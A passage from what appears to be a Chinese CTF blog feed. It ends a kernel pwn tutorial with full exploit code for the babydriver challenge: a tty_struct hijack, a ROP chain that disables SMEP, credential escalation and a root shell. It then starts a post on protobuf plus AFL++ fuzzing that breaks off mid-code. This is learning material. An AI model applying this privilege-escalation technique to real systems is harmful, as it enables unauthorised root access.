(<span class="keyword">char</span>**)(overwrite_mem + ops_ptr_offset);</span><br><span class="line"></span><br><span class="line">    read(fd2, overwrite_mem, <span class="keyword">sizeof</span>(overwrite_mem));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+] origin ops ptr addr: %p\n"</span>, *ops_ptr_addr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 修改并覆写 tty_struct 结构体</span></span><br><span class="line">    *ops_ptr_addr = (<span class="keyword">char</span>*)fake_tty_ops;</span><br><span class="line">    write(fd2, overwrite_mem, <span class="keyword">sizeof</span>(overwrite_mem));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+] hacked ops ptr addr: %p\n"</span>, *ops_ptr_addr);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 触发 tty_write</span></span><br><span class="line">    <span class="comment">// 注意使用 write 时， buf 指针必须有效，否则会提前返回 EFAULT</span></span><br><span class="line">    <span class="keyword">int</span> buf[] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    write(master_fd, buf, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行效果：</p>
<p><img src="/2021/10/kernel_pwn_introduction/image-20211013214429834.png" alt="image-20211013214429834"></p>
<p>下面是一个简化版的 exploit:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> xchg_eax_esp_addr           0xffffffff8100008a</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> prepare_kernel_cred_addr    0xffffffff810a1810</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> commit_creds_addr           0xffffffff810a1420</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pop_rdi_addr                0xffffffff810d238d</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> mov_cr4_rdi_pop_rbp_addr    0xffffffff81004d80</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> swapgs_pop_rbp_addr         0xffffffff81063694          </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> iretq_addr                  0xffffffff814e35ef</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_root_cred</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">void</span>* (*prepare_kernel_cred)(<span class="keyword">void</span>*) = prepare_kernel_cred_addr;</span><br><span class="line">    <span class="keyword">void</span> (*commit_creds)(<span class="keyword">void</span>*) = commit_creds_addr;</span><br><span class="line">    commit_creds(prepare_kernel_cred(<span class="literal">NULL</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> user_cs, user_eflags, user_rsp, user_ss;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_iret_data</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    __asm__ __volatile__ (<span class="string">"mov %%cs, %0"</span> : <span class="string">"=r"</span> (user_cs));</span><br><span class="line">    __asm__ __volatile__ (<span class="string">"pushf"</span>);</span><br><span class="line">    __asm__ __volatile__ (<span class="string">"pop %0"</span> : <span class="string">"=r"</span> (user_eflags));</span><br><span class="line">    __asm__ __volatile__ (<span class="string">"mov %%rsp, %0"</span> : <span class="string">"=r"</span> (user_rsp));</span><br><span class="line">    __asm__ __volatile__ (<span class="string">"mov %%ss, %0"</span> : <span class="string">"=r"</span> (user_ss));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    save_iret_data();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd1 = open(<span class="string">"/dev/babydev"</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">int</span> fd2 = open(<span class="string">"/dev/babydev"</span>, O_RDWR);</span><br><span class="line">    ioctl(fd1, <span class="number">65537</span>, <span class="number">0x2e0</span>);</span><br><span class="line">    close(fd1);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> master_fd = open(<span class="string">"/dev/ptmx"</span>, O_RDWR);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">u_int64_t</span> fake_tty_ops[] = &#123;</span><br><span class="line">        <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">        xchg_eax_esp_addr</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">u_int64_t</span> hijacked_stack_addr = ((<span class="keyword">u_int64_t</span>)fake_tty_ops &amp; <span class="number">0xffffffff</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span>* fake_stack = mmap(</span><br><span class="line">            (hijacked_stack_addr &amp; (~<span class="number">0xffff</span>)),</span><br><span class="line">            <span class="number">0x10000</span>,</span><br><span class="line">            PROT_READ | PROT_WRITE,                    </span><br><span class="line">            MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED,</span><br><span class="line">            <span class="number">-1</span>,</span><br><span class="line">            <span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">u_int64_t</span> rop_chain_mem[] = &#123;</span><br><span class="line">        pop_rdi_addr, <span class="number">0x6f0</span>, </span><br><span class="line">        mov_cr4_rdi_pop_rbp_addr, <span class="number">0</span>, set_root_cred,</span><br><span class="line">        swapgs_pop_rbp_addr, <span class="number">0</span>, </span><br><span class="line">        iretq_addr, get_shell, user_cs, user_eflags, user_rsp, user_ss</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="built_in">memcpy</span>(hijacked_stack_addr, rop_chain_mem, <span class="keyword">sizeof</span>(rop_chain_mem));</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> ops_ptr_offset = <span class="number">4</span> + <span class="number">4</span> + <span class="number">8</span> + <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">char</span> overwrite_mem[ops_ptr_offset + <span class="number">8</span>];</span><br><span class="line">    <span class="keyword">char</span>** ops_ptr_addr = overwrite_mem + ops_ptr_offset;</span><br><span class="line"></span><br><span class="line">    read(fd2, overwrite_mem, <span class="keyword">sizeof</span>(overwrite_mem));</span><br><span class="line">    *ops_ptr_addr = fake_tty_ops;</span><br><span class="line">    write(fd2, overwrite_mem, <span class="keyword">sizeof</span>(overwrite_mem));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> buf[] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    write(master_fd, buf, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="五、参考">五、参考</h2>
<ul>
<li><a href="https://wiki.x10sec.org/pwn/linux/kernel-mode/environment/readme/" target="_blank" rel="noopener">CTF Wiki - Linux Platform Kernel Mode</a></li>
<li><a href="https://linuxlink.timesys.com/docs/how_to_use_kgdb" target="_blank" rel="noopener">How to use KGDB - LinuxLink</a></li>
<li><a href="https://d1nn3r.github.io/2019/07/27/kernelexp/" target="_blank" rel="noopener">kernelexp学习笔记</a></li>
<li><a href="https://blog.csdn.net/m0_38100569/article/details/100673103" target="_blank" rel="noopener">【Writeup】CISCN2017_Pwn_babydriver - CSDN</a></li>
<li><em><a href="https://lwn.net/Kernel/LDD3/" target="_blank" rel="noopener">Linux Device Drivers, Third Edition - Chapter 3 Char Drivers</a></em></li>
<li><a href="https://blog.csdn.net/tq384998430/article/details/54342044" target="_blank" rel="noopener">Linux下使用class_create,device_create自动创建设备文件结点</a></li>
<li><a href="https://www.cnblogs.com/bittorrent/p/3789193.html" target="_blank" rel="noopener">Linux下tty/pty/pts/ptmx详解</a></li>
<li><a href="https://www.cnblogs.com/dux2016/articles/6236131.html" target="_blank" rel="noopener">Linux终端简介与pty编程</a></li>
<li>Linux manual page</li>
</ul>
]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>Pwn</tag>
        <tag>kernel</tag>
      </tags>
  </entry>
  <entry>
    <title>使用 protobuf &amp; AFLplusplus 进行简易 CTF 自动化 fuzz</title>
    <url>/2021/09/protobuf_ctf_fuzz/</url>
    <content><![CDATA[<h2 id="一、简介">一、简介</h2>
<p>看 <a href="https://github.com/google/fuzzing/blob/master/docs/structure-aware-fuzzing.md" target="_blank" rel="noopener">fuzz 的结构感知</a> 时遇到了 protobuf，觉得很有意思，于是尝试使用 protobuf 来进行快速简易的 CTF fuzz。</p>
<p>以下以 <a href="https://ctftime.org/task/16415" target="_blank" rel="noopener">TCTF2021-babyheap2021</a> 为例，来简单说明一下自动化步骤。</p>
<p>这里主要用到以下项目：</p>
<ul>
<li><a href="https://github.com/AFLplusplus/AFLplusplus" target="_blank" rel="noopener">AFL++</a>，其中的 qemu mode + qasan</li>
<li><a href="https://github.com/thebabush/afl-libprotobuf-mutator" target="_blank" rel="noopener">afl-libprotobuf-mutator</a></li>
</ul>
<p>需要注意的是，该 fuzz 目前处于实验性版本，可能不太稳定，仅作为学习研究使用。</p>
<a id="more"></a>
<h2 id="二、操作流程">二、操作流程</h2>
<h3 id="1-下载依赖">1. 下载依赖</h3>
<p>git clone 下 AFL++ 和 afl-libprotobuf-mutator （链接在上面）即可。</p>
<h3 id="2-配置-afl-libprotobuf-mutator">2. 配置 afl-libprotobuf-mutator</h3>
<ul>
<li>
<p>首先，用 ida64 打开 babyheap2021, F5阅读伪代码并总结其输入模板，最后用 protobuf 描述输入结构：</p>
<blockquote>
<p>这类菜单题的输入模板大体上比较固定，下面的代码随便改改就能换一道题目用用。</p>
</blockquote>
<p>代码编写完成后，覆盖保存至 <code>afl-libprotobuf-mutator/gen/out.proto</code>。注意<strong>路径必须完成一致</strong>，若遇到重名文件 out.proto 则直接替换。</p>
<blockquote>
<p>如果不会写 protobuf 描述的话，可以看看这个 <a href="https://developers.google.com/protocol-buffers/docs/tutorials" target="_blank" rel="noopener">Protocol Buffers Tutorials</a>。</p>
</blockquote>
<figure class="highlight protobuf"><table><tr><td class="code"><pre><span class="line"><span class="comment">// out.proto</span></span><br><span class="line">syntax = <span class="string">"proto2"</span>;</span><br><span class="line"><span class="keyword">package</span> menuctf;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">message</span> <span class="title">AllocChoice</span> </span>&#123;</span><br><span class="line">  <span class="keyword">required</span> <span class="built_in">int32</span> choice_id = <span class="number">1</span> [default=<span class="number">1</span>];</span><br><span class="line">  <span class="keyword">required</span> <span class="built_in">int32</span> size = <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">required</span> <span class="built_in">string</span> content = <span class="number">3</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">message</span> <span class="title">UpdateChoice</span> </span>&#123;</span><br><span class="line">  <span class="keyword">required</span> <span class="built_in">int32</span> choice_id = <span class="number">1</span> [default=<span class="number">2</span>];</span><br><span class="line">  <span class="keyword">required</span> <span class="built_in">int32</span> idx = <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">required</span> <span class="built_in">int32</span> size = <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">required</span> <span class="built_in">string</span> content = <span class="number">4</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">message</span> <span class="title">DeleteChoice</span> </span>&#123;</span><br><span class="line">  <span class="keyword">required</span> <span class="built_in">int32</span> choice_id = <span class="number">1</span> [default=<span class="number">3</span>];</span><br><span class="line">  <span class="keyword">required</span> <span class="built_in">int32</span> idx = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">message</span> <span class="title">ViewChoice</span> </span>&#123;</span><br><span class="line">  <span class="keyword">required</span> <span class="built_in">int32</span> choice_id = <span class="number">1</span> [default=<span class="number">4</span>];</span><br><span class="line">  <span class="keyword">required</span> <span class="built_in">int32</span> idx = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">message</span> <span class="title">ExitChoice</span> </span>&#123;</span><br><span class="line">  <span class="keyword">required</span> <span class="built_in">int32</span> choice_id = <span class="number">1</span> [default=<span class="number">5</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Our address book file is just one of these.</span></span><br><span class="line"><span class="class"><span class="keyword">message</span> <span class="title">ChoiceList</span> </span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">message</span> <span class="title">Choice</span> </span>&#123;</span><br><span class="line">    <span class="keyword">oneof</span> the_choice&#123;</span><br><span class="line">      AllocChoice alloc_choice = <span class="number">1</span>;</span><br><span class="line">      UpdateChoice update_choice = <span class="number">2</span>;</span><br><span class="line">      DeleteChoice delete_choice = <span class="number">3</span>;</span><br><span class="line">      ViewChoice view_choice = <span class="number">4</span>;</span><br><span class="line">      ExitChoice exit_choice = <span class="number">5</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">repeated</span> Choice choice = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>到了这里，我们需要理一理思路。对于CTF题来说，大多都是直接从 stdin 中获取输入的<strong>文本数据</strong>。因此首先，我们需要编写 <code>Protobuf::Message</code> 转<strong>常规输入字符串</strong>的代码：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ProtoToDataHelper</span><span class="params">(<span class="built_in">std</span>::<span class="built_in">stringstream</span> &amp;out, <span class="keyword">const</span> google::protobuf::Message &amp;msg)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> google::protobuf::Descriptor *desc = msg.GetDescriptor();</span><br><span class="line">  <span class="keyword">const</span> google::protobuf::Reflection *refl = msg.GetReflection();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">unsigned</span> fields = desc-&gt;field_count();</span><br><span class="line">  <span class="comment">// std::cout &lt;&lt; msg.DebugString() &lt;&lt; std::endl;</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">unsigned</span> i = <span class="number">0</span>; i &lt; fields; ++i) &#123;</span><br><span class="line">    <span class="keyword">const</span> google::protobuf::FieldDescriptor *field = desc-&gt;field(i);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 对于单个 choice</span></span><br><span class="line">    <span class="keyword">if</span> (field-&gt;cpp_type() == google::protobuf::FieldDescriptor::CPPTYPE_MESSAGE) &#123;</span><br><span class="line">      <span class="comment">// 如果当前是 choice list</span></span><br><span class="line">      <span class="keyword">if</span> (field-&gt;is_repeated()) &#123;</span><br><span class="line">        <span class="keyword">const</span> google::protobuf::RepeatedFieldRef&lt;google::protobuf::Message&gt; &amp;ptr = refl-&gt;GetRepeatedFieldRef&lt;google::protobuf::Message&gt;(msg, field);</span><br><span class="line">        <span class="comment">// 将每个 choice 打出来</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">const</span> <span class="keyword">auto</span> &amp;child : ptr) &#123;</span><br><span class="line">          ProtoToDataHelper(out, child);</span><br><span class="line">          out &lt;&lt; <span class="string">"\n"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="comment">// 如果当前是某个子 choice</span></span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (refl-&gt;HasField(msg, field)) &#123;</span><br><span class="line">        <span class="keyword">const</span> google::protobuf::Message &amp;child = refl-&gt;GetMessage(msg, field);</span><br><span class="line">        ProtoToDataHelper(out, child);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="comment">// 对于单个 field</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (field-&gt;cpp_type() == google::protobuf::FieldDescriptor::CPPTYPE_INT32) &#123;</span><br><span class="line">      out &lt;&lt; refl-&gt;GetInt32(msg, field);</span><br><span class="line">      <span class="keyword">if</span>(i &lt; fields - <span class="number">1</span>) </span><br><span class="line">        out &lt;&lt; <span class="string">" "</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (field-&gt;cpp_type() == google::protobuf::FieldDescriptor::CPPTYPE_STRING) &#123;</span><br><span class="line">      out &lt;&lt; refl-&gt;GetString(msg, field);</span><br><span class="line">      <span class="keyword">if</span>(i &lt; fields - <span class="number">1</span>) </span><br><span class="line">        out &lt;&lt; <span class="string">" "</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">abort</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>之后，参照 AFL++ 的 <a href="https://github.com/AFLplusplus/AFLplusplus/blob/dev/docs/custom_mutators.md" target="_blank" rel="noopener">Custom Mutators in AFL++</a>，完成一些必要的 custom mutate 函数。</p>
<p>这里我们需要完成以下几种函数：</p>
<ul>
<li><code>void *afl_custom_init(void *afl, unsigned int seed)</code>：在执行 custom mutate 前需要执行的初始化操作，这里只需初始化一下随机种子。</li>
<li><code>size_t afl_custom_fuzz(void *data, unsigned char *buf, size_t buf_size, unsigned char **out_buf, unsigned char *add_buf, size_t add_buf_size, size_t max_size)</code> ：变异逻辑，在该代码中编写自己的变异逻辑。</li>
<li><code>size_t afl_custom_post_process(void* data, uint8_t *buf, size_t buf_size, uint8_t **out_buf)</code>：将 protobuf::Message 格式的二进制数据转换成 target 可读的数据。</li>
<li><code>void afl_custom_deinit(void *data)</code>：变异完成后需要做的事情，目前没有什么事情需要在这里进行处理。</li>
<li><code>int32_t afl_custom_init_trim(void *data, uint8_t *buf, size_t buf_size)</code>：自定义 trim 逻辑的初始化。为了<strong>防止 trim 逻辑破坏 protobuf::Message 的二进制数据</strong>，影响正常的 Parse 过程，这里可以让该函数直接返回0，跳过每次的 trim 阶段。</li>
<li><code>size_t afl_custom_trim(void *data, uint8_t **out_buf)</code>：自定义 trim 逻辑。由于<code>afl_custom_init_trim</code>函数返回0，因此实际上该函数不会被调用，但我们仍然必须声明该函数以启用自定义 trim 逻辑。</li>
</ul>
<blockquote>
<p>需要注意的是，这一整个 <code>extern &quot;C&quot;</code> 的代码以及内部用到的 <code>ProtoToDataHelper</code> 函数的代码，必须全部放在 <code>afl-libprotobuf-mutator/src/mutate.cc</code> 中。</p>
<p>由于 afl-libprotobuf-mutator 较为久远，因此大部分 AFL++ 相关的接口需要修改亿下。</p>
</blockquote>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// AFLPlusPlus interface</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">"C"</span> &#123;</span><br><span class="line">  <span class="keyword">static</span> <span class="built_in">std</span>::default_random_engine engine_pro;</span><br><span class="line">  <span class="function"><span class="keyword">static</span> <span class="built_in">std</span>::uniform_int_distribution&lt;<span class="keyword">unsigned</span> <span class="keyword">int</span>&gt; <span class="title">dis</span><span class="params">(<span class="number">0</span>, UINT32_MAX)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">void</span> *<span class="title">afl_custom_init</span><span class="params">(<span class="keyword">void</span> *afl, <span class="keyword">unsigned</span> <span class="keyword">int</span> seed)</span> </span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">pragma</span> unused (afl)</span></span><br><span class="line">    engine_pro.seed(seed);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">afl_custom_deinit</span><span class="params">(<span class="keyword">void</span> *data)</span> </span>&#123;</span><br><span class="line">    assert(!data);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// afl_custom_fuzz</span></span><br><span class="line">  <span class="function"><span class="keyword">size_t</span> <span class="title">afl_custom_fuzz</span><span class="params">(<span class="keyword">void</span> *data, <span class="keyword">unsigned</span> <span class="keyword">char</span> *buf, <span class="keyword">size_t</span> buf_size, <span class="keyword">unsigned</span> <span class="keyword">char</span> **out_buf, </span></span></span><br><span class="line"><span class="function"><span class="params">                         <span class="keyword">unsigned</span> <span class="keyword">char</span> *add_buf, <span class="keyword">size_t</span> add_buf_size, <span class="keyword">size_t</span> max_size)</span> </span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">pragma</span> unused (data)</span></span><br><span class="line">    <span class="meta">#<span class="meta-keyword">pragma</span> unused (add_buf)</span></span><br><span class="line">    <span class="meta">#<span class="meta-keyword">pragma</span> unused (add_buf_size)</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">uint8_t</span> *saved_buf = <span class="literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line">    assert(buf_size &lt;= max_size);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">uint8_t</span> *new_buf = (<span class="keyword">uint8_t</span> *) <span class="built_in">realloc</span>((<span class="keyword">void</span> *)saved_buf, max_size);</span><br><span class="line">    <span class="keyword">if</span> (!new_buf) &#123;</span><br><span class="line">      *out_buf = buf;</span><br><span class="line">      <span class="keyword">return</span> buf_size;</span><br><span class="line">    &#125;</span><br><span class="line">    saved_buf = new_buf;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(new_buf, buf, buf_size);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> new_size = LLVMFuzzerCustomMutator(</span><br><span class="line">      new_buf,</span><br><span class="line">      buf_size,</span><br><span class="line">      max_size,</span><br><span class="line">      dis(engine_pro)</span><br><span class="line">    );</span><br><span class="line">    *out_buf = new_buf;</span><br><span class="line">    <span class="keyword">return</span> new_size;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">size_t</span> <span class="title">afl_custom_post_process</span><span class="params">(<span class="keyword">void</span>* data, <span class="keyword">uint8_t</span> *buf, <span class="keyword">size_t</span> buf_size, <span class="keyword">uint8_t</span> **out_buf)</span> </span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">pragma</span> unused (data)</span></span><br><span class="line">    <span class="comment">// new_data is never free'd by pre_save_handler</span></span><br><span class="line">    <span class="comment">// I prefer a slow but clearer implementation for now</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">uint8_t</span> *saved_buf = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    menuctf::ChoiceList msg;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">stringstream</span> stream;</span><br><span class="line">    <span class="comment">// 如果加载成功</span></span><br><span class="line">    <span class="keyword">if</span> (protobuf_mutator::libfuzzer::LoadProtoInput(<span class="literal">true</span>, buf, buf_size, &amp;msg)) &#123;</span><br><span class="line">      ProtoToDataHelper(stream, msg);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">// printf("[afl_custom_post_process] LoadProtoInput Error\n");   </span></span><br><span class="line">      <span class="comment">// std::ofstream err_bin("err.bin");</span></span><br><span class="line">      <span class="comment">// err_bin.write((char*)buf, buf_size);</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">// abort();</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">// 如果加载失败，则返回 Exit Choice</span></span><br><span class="line">      <span class="comment">/// <span class="doctag">NOTE:</span> 错误的变异 + 错误的 trim 将会导致 post process 加载失败，尤其是 trim 逻辑。</span></span><br><span class="line">      <span class="comment">/// <span class="doctag">TODO:</span> 由于默认的 trim 会破坏样例，因此需要手动实现一个 trim，这里实现了一个空 trim，不进行任何操作</span></span><br><span class="line">      ProtoToDataHelper(stream, menuctf::ExitChoice());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> str = stream.str();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint8_t</span> *new_buf = (<span class="keyword">uint8_t</span> *) <span class="built_in">realloc</span>((<span class="keyword">void</span> *)saved_buf, str.size());</span><br><span class="line">    <span class="keyword">if</span> (!new_buf) &#123;</span><br><span class="line">      *out_buf = buf;</span><br><span class="line">      <span class="keyword">return</span> buf_size;</span><br><span class="line">    &#125;</span><br><span class="line">    *out_buf = saved_buf = new_buf;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>((<span class="keyword">void</span> *)new_buf, str.c_str(), str.size());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> str.size();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">int32_t</span>  <span class="title">afl_custom_init_trim</span><span class="params">(<span class="keyword">void</span> *data, <span class="keyword">uint8_t</span> *buf, <span class="keyword">size_t</span> buf_size)</span> </span>&#123;</span><br><span class="line">    <span class="comment">/// <span class="doctag">NOTE:</span> disable trim</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">size_t</span> <span class="title">afl_custom_trim</span><span class="params">(<span class="keyword">void</span> *data, <span class="keyword">uint8_t</span> **out_buf)</span> </span>&#123;</span><br><span class="line">    <span class="comment">/// <span class="doctag">NOTE:</span> unreachable</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>当然，编写上面的代码需要做一次又一次的测试，这里放上笔者的测试代码片段。这部分测试代码位于 <code>afl-libprotobuf-mutator/src/dump.cc</code>。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">inline</span> <span class="built_in">std</span>::<span class="built_in">string</span> <span class="title">slurp</span><span class="params">(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; path)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">ostringstream</span> buf; </span><br><span class="line">  <span class="function"><span class="built_in">std</span>::ifstream <span class="title">input</span> <span class="params">(path.c_str())</span></span>; </span><br><span class="line">  buf &lt;&lt; input.rdbuf(); </span><br><span class="line">  <span class="keyword">return</span> buf.str();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">"C"</span> &#123;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> *<span class="title">afl_custom_init</span><span class="params">(<span class="keyword">void</span> *afl, <span class="keyword">unsigned</span> <span class="keyword">int</span> seed)</span></span>;</span><br><span class="line">  <span class="function"><span class="keyword">size_t</span> <span class="title">afl_custom_fuzz</span><span class="params">(<span class="keyword">void</span> *data, <span class="keyword">unsigned</span> <span class="keyword">char</span> *buf, <span class="keyword">size_t</span> buf_size, <span class="keyword">unsigned</span> <span class="keyword">char</span> **out_buf, </span></span></span><br><span class="line"><span class="function"><span class="params">                         <span class="keyword">unsigned</span> <span class="keyword">char</span> *add_buf, <span class="keyword">size_t</span> add_buf_size, <span class="keyword">size_t</span> max_size)</span></span>;</span><br><span class="line">  <span class="function"><span class="keyword">size_t</span> <span class="title">afl_custom_post_process</span><span class="params">(<span class="keyword">void</span>* data, <span class="keyword">uint8_t</span> *buf, <span class="keyword">size_t</span> buf_size, <span class="keyword">uint8_t</span> **out_buf)</span></span>;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">afl_custom_deinit</span><span class="params">(<span class="keyword">void</span> *data)</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">  menuctf::ChoiceList msg;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (argc == <span class="number">2</span>) &#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> data = slurp(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">if</span>(!protobuf_mutator::libfuzzer::LoadProtoInput(<span class="literal">true</span>, (<span class="keyword">const</span> <span class="keyword">uint8_t</span> *)data.c_str(), 